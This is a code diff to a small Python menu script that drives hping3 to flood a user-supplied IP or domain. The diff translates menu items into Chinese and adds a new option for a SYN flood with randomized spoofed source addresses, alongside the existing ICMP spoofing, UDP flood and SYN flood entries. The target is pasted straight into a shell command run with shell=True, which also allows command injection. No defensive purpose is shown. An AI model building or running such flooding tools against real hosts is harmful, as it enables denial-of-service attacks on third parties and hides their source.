@@ -23,11 +23,12 @@ print("#" + long * '-' + "#")
 while (True):
     print("""
 	\033[1;94m
-	1- Install hping3
+	1- 下载hping3
 	2- 带伪装的icmp欺骗
-    3- UDP洪水攻击
-    4- SYN洪水攻击
-	5- Exit
+        3- UDP洪水攻击
+        4- SYN洪水攻击
+	5- 使用随机源地址的SYN攻击
+	6- 退出
 	\033[1;m
 	""")
 
@@ -49,8 +50,12 @@ while (True):
         ip = input('\033[1;91mGive me a ip or domain: \033[1;m')
         ping = ('hping3 -c 1000 -d 120 -S --flood ')
         subprocess.call(ping + ip, shell=True)
-
     elif op == '5':
+        ip = input('\033[1;91mGive me a ip or domain: \033[1;m')
+        ping = ('hping3 -c 1000 -d 120 -S --flood --rand-source ')
+        subprocess.call(ping + ip, shell=True)
+
+    elif op == '6':
         break
 
     else:
